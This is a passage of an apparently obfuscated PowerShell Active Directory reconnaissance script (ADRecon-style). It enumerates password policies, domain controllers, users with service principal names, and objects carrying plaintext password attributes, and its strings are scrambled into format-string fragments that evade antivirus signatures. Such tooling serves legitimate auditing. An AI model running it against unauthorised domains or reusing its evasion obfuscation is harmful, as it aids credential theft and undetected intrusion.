            ("{3}{0}{1}{2}{4}{6}{5}" -f'a','ss','word','P',' must ','complexity requirements','meet '), $ComplexPasswords, $true, ("{0}{2}{1}"-f 'Re','. 8.2.3','q'), $true, ("{0}{2}{1}"-f 'Cont','21','rol: 04'), $true,
            ("{1}{13}{10}{12}{0}{2}{9}{6}{18}{4}{11}{5}{8}{16}{14}{15}{7}{3}{17}"-f'd u','S','si','ma','ypt','on fo','rsi','the do','r','ng reve','e','i',' passwor','tor','l','l users in ',' a','in','ble encr'), $ReversibleEncryption, "N/A", "-", "N/A", "-", $false,
            ("{3}{0}{7}{1}{5}{4}{9}{8}{2}{6}" -f'count ','o','tion (mins','Ac','k','c',')','l','t dura','ou'), $LockoutDuration, ("{3}{2}{0}{1}{4}{5}" -f 'nual ','un',' (ma','0','lock) or',' 30'), ("{0}{2}{1}" -f 'Req','8.1.7','. '), "N/A", "-", ("{2}{0}{1}"-f' m','ore','15 or'),
            (("{4}{7}{0}{3}{2}{1}{9}{5}{8}{6}" -f 'ount ','ut th','ocko','l','A','hold ','tempts)','cc','(at','res')), $ObjDomain.LockoutThreshold.value, ("{0}{1}" -f '1',' to 6'), ("{2}{0}{1}" -f'q. 8','.1.6','Re'), ("{0}{1}{2}"-f'1',' ','to 5'), ("{0}{2}{1}" -f 'Control:','3',' 140'), ("{0}{1}" -f '1',' to 10'),
            ("{5}{4}{11}{1}{0}{8}{3}{2}{12}{9}{7}{10}{6}" -f'nt','cou','ut co','o','et a','Res','ter (mins)','r ',' lock','e','af','c','unt'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutobservationWindow.value)/-600000000), "N/A", "-", "N/A", "-", ("{1}{0}{2}" -f '5 or ','1','more') )

            Remove-Variable pwdProperties
            Remove-Variable ComplexPasswords
            Remove-Variable ReversibleEncryption
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
        {
            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Poli','cy') -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}{3}" -f'rent ','ur','C','Value') -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{2}{1}{0}{4}"-f 'Req','DSS ','CI ','P','uirement') -Value $ObjValues[$i+2]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{3}{1}{0}"-f'3.2.1','v','P','CI DSS ') -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'ASD',' ISM') -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}{3}" -f '2018 ISM Con','rol','t','s') -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{3}{1}{4}" -f'h','1','CIS Benc','mark 20','6') -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ObjValues
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRFineGrainedPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Fine Grained Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning ("{14}{2}{8}{13}{11}{17}{16}{25}{19}{18}{22}{10}{21}{5}{3}{15}{6}{23}{12}{1}{9}{7}{20}{4}{0}{24}" -f 'Polic','ne','DRFi','er','rd ','hile enum','ting the','Grain','ne',' ','ro','rainedPa','Fi','G','[Get-A','a','swor','s','cy] E','i','ed Passwo','r w','r',' ','y','dPol')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_.AppliesTo.Count); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_.AppliesTo[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.TrimStart(",")
                }
                $ObjValues = @(("{1}{0}" -f'ame','N'), $($_.Name), ("{2}{0}{1}" -f 'plies ','To','Ap'), $AppliesTo, ("{5}{0}{6}{3}{2}{1}{4}"-f 'for','sto',' hi','rd','ry','En','ce passwo'), $_.PasswordHistoryCount, ("{4}{2}{0}{1}{3}"-f'passwo','rd ag',' ','e (days)','Maximum'), $_.MaxPasswordAge.days, (("{1}{4}{3}{2}{6}{5}{0}" -f')','Minim','g','assword a','um p','days','e (')), $_.MinPasswordAge.days, ("{1}{4}{0}{3}{2}"-f'nimum password','M','ength',' l','i'), $_.MinPasswordLength, ("{7}{6}{2}{1}{5}{9}{0}{3}{4}{8}"-f 'e','et ',' me','xi','ty ','com','rd must','Passwo','requirements','pl'), $_.ComplexityEnabled, ("{9}{1}{10}{7}{5}{2}{0}{8}{6}{3}{4}"-f'ersib',' pass',' rev','ncrypti','on',' using',' e','d','le','Store','wor'), $_.ReversibleEncryptionEnabled, (("{5}{6}{7}{3}{1}{0}{4}{2}"-f'on','ati','ins)','dur',' (m','Acco','unt lo','ckout ')), $_.LockoutDuration.minutes, ("{4}{6}{2}{7}{1}{5}{3}{0}"-f 'old','lo','t','t thresh','A','ckou','ccoun',' '), $_.LockoutThreshold, ("{9}{6}{10}{0}{1}{8}{4}{5}{3}{2}{7}"-f 'un','t lockou','ter ','r af',' coun','te',' acc','(mins)','t','Reset','o'), $_.LockoutObservationWindow.minutes, ("{2}{1}{0}{3}"-f'ede','rec','P','nce'), $($_.Precedence))
                For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'Po','y','lic') -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Valu') -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ADFinepasspolicy
        }
    }

    If ($Method -eq ("{0}{1}" -f 'LDA','P'))
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ("{0}{6}{1}{2}{3}{5}{4}"-f '(o','ctC','lass=msDS-P','asswor','s)','dSetting','bje')
            $ObjSearcher.SearchScope = ("{0}{1}" -f 'Subtr','ee')
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{18}{8}{15}{0}{19}{20}{3}{1}{16}{24}{26}{13}{21}{7}{5}{14}{10}{6}{11}{25}{2}{9}{4}{17}{12}{22}{23}" -f 'i','dP','e ','aine','Password','ro',' ','Er','Get-','Grained ',' while','enumerating ','P','cy]','r','ADRF','asswo',' ','[','ne','Gr',' ','o','licy','r','the Fin','dPoli')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If ([ADRecon.LDAPClass]::ObjectCount($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_.Properties.'msds-psoappliesto'.Count); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_.Properties.'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.TrimStart(",")
                    }
                        $ObjValues = @(("{1}{0}" -f'ame','N'), $($_.Properties.name), ("{1}{2}{0}"-f ' To','Appli','es'), $AppliesTo, ("{3}{2}{4}{0}{5}{6}{1}"-f ' passwo','story','c','Enfor','e','rd',' hi'), $($_.Properties.'msds-passwordhistorylength'), (("{4}{7}{6}{5}{0}{3}{1}{8}{2}"-f 'ssw','ag','days)','ord ','Maximu','a','p','m ','e (')), $($($_.Properties.'msds-maximumpasswordage') /-864000000000), ("{4}{2}{3}{1}{6}{0}{7}{5}"-f 'ge (d','word','p','ass','Minimum ','s)',' a','ay'), $($($_.Properties.'msds-minimumpasswordage') /-864000000000), ("{3}{1}{0}{2}{4}{5}" -f'rd ',' passwo','l','Minimum','e','ngth'), $($_.Properties.'msds-minimumpasswordlength'), ("{0}{6}{4}{1}{5}{2}{7}{3}{8}" -f 'Pa','s','e','ement','rd mu','t meet complexity r','sswo','quir','s'), $($_.Properties.'msds-passwordcomplexityenabled'), ("{7}{9}{11}{5}{10}{0}{12}{3}{4}{8}{1}{2}{6}" -f'g r','p','t','versib','le ','i','ion','Store ','encry','passw','n','ord us','e'), $($_.Properties.'msds-passwordreversibleencryptionenabled'), (("{7}{6}{8}{3}{4}{5}{2}{1}{0}" -f 's)',' (min','tion','lockout du','r','a','cou','Ac','nt ')), $($($_.Properties.'msds-lockoutduration')/-600000000), ("{6}{7}{2}{4}{5}{0}{3}{1}"-f 'thre','hold','k','s','ou','t ','A','ccount loc'), $($_.Properties.'msds-lockoutthreshold'), ("{2}{1}{5}{4}{0}{7}{6}{3}" -f'unte','ese','R','after (mins)',' lockout co','t account',' ','r'), $($($_.Properties.'msds-lockoutobservationwindow')/-600000000), ("{2}{1}{0}{3}" -f 'c','en','Preced','e'), $($_.Properties.'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues.Count); $i++)
                        {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'olicy','P') -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Valu','e') -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ADFinepasspolicy
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDomainController
{
<#
.SYNOPSIS
    Returns the domain controllers for the current (or specified) forest.

.DESCRIPTION
    Returns the domain controllers for the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            $ADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning ("{16}{0}{5}{14}{3}{4}{12}{17}{15}{18}{8}{10}{2}{13}{1}{7}{6}{11}{9}" -f 'Get-','ler ',' Domai','omainCon','tro','A','bj','O','merat','s','ing','ect','lle','nControl','DRD','while en','[','r] Error ','u')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        # DC Info
        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            $DCObj = [ADRecon.ADWSClass]::DomainControllerParser($ADDomainControllers, $Threads)
            Remove-Variable ADDomainControllers
        }
    }

    If ($Method -eq ("{1}{0}"-f 'DAP','L'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}" -f 'D','omain'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ("{10}{4}{3}{9}{6}{7}{5}{8}{2}{0}{1}" -f'n C','ontext','i','omai','RD','tin','r] Error ge','t','g Doma','nControlle','[Get-AD')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }

        If ($ADDomain.DomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            $DCObj = [ADRecon.LDAPClass]::DomainControllerParser($ADDomain.DomainControllers, $Threads)
            Remove-Variable ADDomain
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRUser
{
<#
.SYNOPSIS
    Returns all users and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all users and/or  service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRUsers
    [bool]

.PARAMETER ADRUserSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [int] $ADRUsers = $true,

        [Parameter(Mandatory = $false)]
        [int] $ADRUserSPNs = $false
    )

    If ($Method -eq ("{1}{0}"-f 'DWS','A'))
    {
        If (!$ADRUsers)
        {
            Try
            {
                $ADUsers = @( Get-ADObject -LDAPFilter ((("{7}{4}{9}{12}{8}{5}{1}{10}{0}{11}{2}{6}{3}"-f ')(service','=805','cipal','*))','(samA','tType','Name=','(&','oun','c','306368','Prin','c'))) -ResultPageSize $PageSize -Properties Name,Description,memberOf,sAMAccountName,servicePrincipalName,primaryGroupID,pwdLastSet,userAccountControl )
            }
            Catch
            {
                Write-Warning ("{3}{0}{7}{6}{2}{11}{9}{5}{8}{1}{10}{4}"-f'-','rSPN',' Error ','[Get','ts','ile enumerati',']','ADRUser','ng Use','h',' Objec','w')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties AccountExpirationDate,accountExpires,AccountNotDelegated,AdminCount,AllowReversiblePasswordEncryption,c,CannotChangePassword,CanonicalName,Company,Department,Description,DistinguishedName,DoesNotRequirePreAuth,Enabled,givenName,homeDirectory,Info,LastLogonDate,lastLogonTimestamp,LockedOut,LogonWorkstations,mail,Manager,memberOf,middleName,mobile,("{3}{6}{0}{1}{2}{4}{5}" -f '-All','o','w','msD','edToDelega','teTo','S'),("{0}{3}{1}{4}{8}{6}{5}{2}{7}" -f 'msDS-Sup','ortedEncry','p','p','pt','Ty','on','es','i'),Name,PasswordExpired,PasswordLastSet,PasswordNeverExpires,PasswordNotRequired,primaryGroupID,profilePath,pwdlastset,SamAccountName,ScriptPath,servicePrincipalName,SID,SIDHistory,SmartcardLogonRequired,sn,Title,TrustedForDelegation,TrustedToAuthForDelegation,UseDESKeyOnly,UserAccountControl,whenChanged,whenCreated )
            }
            Catch
            {
                Write-Warning ("{2}{3}{1}{0}{8}{6}{4}{5}{7}" -f 'er] Error wh','Us','[Get-A','DR','erating ','User Object','le enum','s','i')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                Try
                {
                    $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    $PassMaxAge = $ADpasspolicy.MaxPasswordAge.days
                    Remove-Variable ADpasspolicy
                }
                Catch
                {
                    Write-Warning ("{0}{22}{6}{19}{16}{21}{9}{3}{4}{10}{14}{12}{18}{15}{20}{7}{24}{17}{5}{8}{2}{13}{1}{11}{23}"-f'[Get-ADRU','g v','ol','ving ','M',' ','r] E',' ','P','ie','a','alu',' Password Age f','icy. Usin','x','aul','r','rd','rom the Def','rror ','t','etr','se','e as 90 days','Passwo')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj = [ADRecon.ADWSClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj = [ADRecon.ADWSClass]::UserSPNParser($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{1}{0}"-f 'DAP','L'))
    {
        If (!$ADRUsers)
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ("{6}{15}{14}{5}{2}{11}{9}{13}{7}{4}{1}{0}{8}{12}{3}{10}" -f'i','v','ount','alN','r','mAcc','(&(','8)(se','c','yp','ame=*))','T','ePrincip','e=80530636','a','s')
            $ObjSearcher.PropertiesToLoad.AddRange((("{1}{0}"-f'me','na'),("{1}{0}{2}{3}"-f 'p','descri','ti','on'),("{1}{0}{2}" -f'ero','memb','f'),("{3}{0}{1}{2}"-f'amaccoun','t','name','s'),("{1}{0}{4}{2}{3}"-f 'r','se','epr','incipalname','vic'),("{4}{1}{0}{3}{2}"-f'm','ri','d','arygroupi','p'),("{0}{3}{2}{1}" -f'p','set','t','wdlas'),("{4}{0}{3}{1}{2}"-f 'er','ccoun','tcontrol','a','us')))
            $ObjSearcher.SearchScope = ("{0}{1}" -f'Subtre','e')
            Try
            {
                $ADUsers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{12}{15}{1}{0}{5}{2}{11}{14}{4}{10}{7}{6}{13}{8}{3}{9}"-f' ','User] Error','hil','ect','ratin','w','Us',' ','bj','s','g','e ','[Ge','erSPN O','enume','t-ADR')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        Else
        {
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ("{5}{1}{2}{7}{0}{4}{3}{6}"-f 'ountType','sam','Ac','3063','=805','(','68)','c')
            # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
            $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]("{1}{0}"-f'cl','Da')
            $ObjSearcher.PropertiesToLoad.AddRange((("{1}{0}{2}" -f'ntExpire','accou','s'),("{1}{2}{0}{3}"-f 'n','admi','ncou','t'),"c",("{1}{0}{2}" -f 'ic','canon','alname'),("{0}{1}"-f 'compa','ny'),("{1}{2}{0}"-f'nt','depart','me'),("{2}{3}{0}{1}" -f 'riptio','n','de','sc'),("{0}{1}{2}{4}{3}" -f 'd','ist','in','ame','guishedn'),("{0}{1}{2}" -f 'gi','venN','ame'),("{0}{2}{1}"-f'homedire','ory','ct'),("{0}{1}" -f 'in','fo'),("{3}{4}{1}{0}{2}" -f 'est','ontim','amp','las','tLog'),("{1}{0}" -f'l','mai'),("{1}{0}"-f 'ger','mana'),("{0}{1}{2}"-f 'm','ember','of'),("{1}{2}{0}"-f 'e','mi','ddleNam'),("{0}{1}" -f 'mobi','le'),("{3}{2}{4}{1}{0}" -f 'elegateTo','wedToD','S','msD','-Allo'),("{0}{6}{2}{1}{4}{7}{3}{5}{8}" -f 'msD','p','Su','onT','portedEncryp','y','S-','ti','pes'),("{0}{1}"-f 'na','me'),("{1}{3}{2}{0}" -f'tydescriptor','n','securi','t'),("{2}{0}{1}" -f'ectsi','d','obj'),("{2}{1}{0}{3}"-f 'rygroupi','rima','p','d'),("{0}{2}{1}{3}" -f'p','o','r','filepath'),("{2}{1}{0}"-f 'Set','dLast','pw'),("{3}{4}{1}{0}{2}"-f 'untNam','o','e','s','amacc'),("{2}{0}{3}{1}"-f 'rip','h','sc','tpat'),("{2}{0}{3}{4}{1}" -f'ervicep','lname','s','rinci','pa'),("{2}{1}{0}" -f'tory','his','sid'),"sn",("{1}{0}" -f'tle','ti'),("{3}{2}{0}{1}"-f'tcontr','ol','oun','useracc'),("{3}{0}{1}{2}"-f'work','sta','tions','user'),("{1}{0}{2}"-f 'e','whenchang','d'),("{0}{1}{2}"-f'whe','ncre','ated')))
            $ObjSearcher.SearchScope = ("{1}{0}{2}"-f't','Sub','ree')
            Try
            {
                $ADUsers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ("{8}{2}{12}{1}{3}{7}{10}{11}{5}{13}{4}{0}{9}{14}{6}" -f'Us','DRUser]','t',' Error',' ','erat','ts',' w','[Ge','er Ob','h','ile enum','-A','ing','jec')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                $PassMaxAge = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000)
                If (-Not $PassMaxAge)
                {
                    Write-Warning ("{12}{13}{6}{2}{0}{7}{17}{11}{15}{9}{19}{1}{8}{18}{14}{16}{3}{4}{5}{10}" -f 's','ax Password','DRU','d Poli','cy. Usi','ng value as','-A','er] Err',' A','e',' 90 days','r','[Ge','t','m the Defa',' retri','ult Passwor','o','ge fro','ving M')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj = [ADRecon.LDAPClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj = [ADRecon.LDAPClass]::UserSPNParser($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Export-ADR -ADRObj $UserObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f 'U','sers')
        Remove-Variable UserObj
    }
    If ($UserSPNObj)
    {
        Export-ADR -ADRObj $UserSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f'UserSPN','s')
        Remove-Variable UserSPNObj
    }
}

#TODO
Function Get-ADRPasswordAttributes
{
<#
.SYNOPSIS
    Returns all objects with plaintext passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all objects with plaintext passwords in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.

.LINK
    https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/com.ibm.aix.security/ad_password_attribute_selection.htm
    https://msdn.microsoft.com/en-us/library/cc223248.aspx
    https://msdn.microsoft.com/en-us/library/cc223249.aspx
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Method -eq ("{0}{1}"-f'A','DWS'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter ((("{3}{5}{4}{11}{0}{6}{14}{2}{13}{10}{8}{1}{12}{9}{16}{7}{15}"-f'(UnixUser','wd=','word=*','(','erPa','AFM(Us','P','0','eP',')','d','ssword=*)','*',')(unico','ass','Password=*))','(msSFU3')).rEplacE('AFM',[strINg][cHar]124)) -ResultPageSize $PageSize -Properties *
        }
        Catch
        {
            Write-Warning ("{2}{13}{10}{0}{14}{12}{7}{6}{1}{4}{3}{5}{11}{8}{9}" -f 'asswordA','merat','[','wo','ing Pass','rd Att','Error while enu',' ','b','utes','t-ADRP','ri','ibutes]','Ge','ttr')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ((("{16}{17}{9}{8}{3}{0}{12}{6}{10}{5}{14}{11}{2}{7}{13}{1}{15}{4}"-f'UserPas',')(msSFU','un','ssword=*)(Unix','Password=*))','d=*','o','ic','serPa','(U','r','(','sw','odePwd=*',')','30','(','oYh'))  -rePlace ([cHar]111+[cHar]89+[cHar]104),[cHar]124)
        $ObjSearcher.SearchScope = ("{1}{0}"-f'tree','Sub')
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{15}{17}{2}{14}{13}{11}{5}{8}{12}{16}{10}{7}{4}{3}{0}{1}{9}{6}" -f 'rating Pass','wo','RP','ume','le en','ttributes','Attributes',' whi','] ','rd ','r','dA','Err','wor','ass','[G','o','et-AD')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $cnt = [ADRecon.LDAPClass]::ObjectCount($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning ('[*'+'] '+'Tot'+'a'+'l '+'Passw'+'o'+'r'+'dAtt'+'ribute '+'Ob'+'j'+'ects: '+"$cnt")
            }
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroup
{
<#
.SYNOPSIS
    Returns all groups and/or membership changes in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and/or membership changes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRGroups
    [bool]

.PARAMETER ADRGroupChanges
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [bool] $ADRGroups = $true,

        [Parameter(Mandatory = $false)]
        [bool] $ADRGroupChanges = $false
    )

    If ($Method -eq ("{1}{0}"-f'S','ADW'))
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,("{4}{3}{0}{2}{1}" -f 'Me','ata','taD','lValue','msDS-Rep'),whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ("{13}{14}{6}{5}{4}{10}{15}{3}{2}{12}{11}{0}{9}{1}{8}{7}" -f 'ra','ro','while ','ror ','p','RGrou','AD','ects','up Obj','ting G',']','ume','en','[Ge','t-',' Er')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj = [ADRecon.ADWSClass]::GroupParser($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj = [ADRecon.ADWSClass]::GroupChangeParser($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LDA','P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
